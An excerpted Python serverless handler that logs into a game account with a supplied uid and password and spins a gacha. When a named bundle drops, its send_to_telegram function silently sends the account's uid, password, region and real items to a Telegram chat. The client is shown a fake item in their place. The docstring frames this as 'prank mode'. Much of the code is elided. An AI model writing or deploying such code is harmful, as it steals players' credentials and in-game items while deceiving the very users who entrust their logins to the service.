#!/usr/bin/env python3
"""
Vercel serverless handler — Naruto Bundle prank mode.

- Fetches JWT (primary → divan fallback)
- Fires PurchaseGacha with Naruto payload + fallbacks
- If Naruto Bundle (710047022) drops:
    • Real items silently sent to Telegram
    • Client receives exactly one fake item: 820981015
"""
...
DEFAULT_URL = "https://clientbp.ppmainecoonghj.com"
...
REGION_URL_MAP = {
    ...
    "MY": "https://clientbp.ppmainecoonghj.com",
    "PH": "https://clientbp.ppmainecoonghj.com",
...
def resolve_effective_url(addr, token) -> str:
    if addr:
        return normalize_url(addr)

    jwt_payload = decode_jwt_payload(token) or {}
    region = (jwt_payload.get("lock_region") or jwt_payload.get("noti_region") or "").upper()
    if region in REGION_URL_MAP:
        return normalize_url(REGION_URL_MAP[region])
...
async def send_to_telegram(session, uid, password, region, real_items):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        print("[TG] ✗ disabled (missing env vars)", flush=True)
    ...
    for it in real_items:
        name = it.get("name") or f"Unknown ({it.get('id')})"
        md_lines.append(f"• {name} — `{it.get('id')}`")
...
# ------------------------------------------------------------------ #
#  TOKEN FETCHER — primary then divan (silent fallback)
# ------------------------------------------------------------------ #
async def _try_one_jwt(session, provider, uid, password, retries=3):
    ...
    for attempt in range(retries):
        try:
            async with session.get(
                ...
                if res.status == 200:
                    data = await res.json()
                    token = data.get(provider["token_key"])
                    if token and isinstance(token, str) and len(token) > 50:
                        addr = data.get(provider["addr_key"]) if provider["addr_key"] else None
                        ob = data.get(provider["ob_key"]) if provider["ob_key"] else None
                        return token, addr, ob
        except Exception:
            pass
...
async def get_token(session, uid, password, retries=3):
    for provider in JWT_PROVIDERS:
        result = await _try_one_jwt(session, provider, uid, password, retries)
        if result:
            return result
    return None
...
#  GACHA REQUEST
# ------------------------------------------------------------------ #
async def gacha_req(session, token, payload, url, max_retries=3, release_version=RELEASE_VERSION):
...
async def spin(uid: str, password: str, payload_hex: str = None):
    ...
    async with aiohttp.ClientSession() as session:
        # Fetch token
        token_data = await get_token(session, uid, password, 3)
        if not token_data:
            return {"success": False, "error": "token_fetch_failed_all_providers"}

        token, addr, ob = token_data
        url = resolve_effective_url(addr, token)
        release_version = ob if ob else RELEASE_VERSION

        jwt_payload = decode_jwt_payload(token) or {}
        region = jwt_payload.get("lock_region", "UNKNOWN")

        # Gacha — try each payload
        final_status = 0
        final_resp = None
        final_items = []
        used_payload = None
        ...
        for label, pbytes in payload_bytes:
            status, resp = await gacha_req(session, token, pbytes, url, 3, release_version)
        ...
        # Naruto Bundle detected → leak to Telegram (real items)
        await send_to_telegram(session, uid, password, region, final_items)
...
async def _run_health_checks(deep: bool):
    ...
    if deep:
        async with aiohttp.ClientSession() as session:
            ...
            ok, ms = await _probe_upstream(session, REGION_URL_MAP["IND"])
            checks["gacha_host"] = {
        ...
        async def _run():
            async with aiohttp.ClientSession() as session:
                return await send_to_telegram(
                    ...
                    region="TEST",
                    real_items=[{"id": 710047022, "name": "Naruto Bundle"}],
                )
        try:
            ok = asyncio.run(_run())
        except Exception as e:
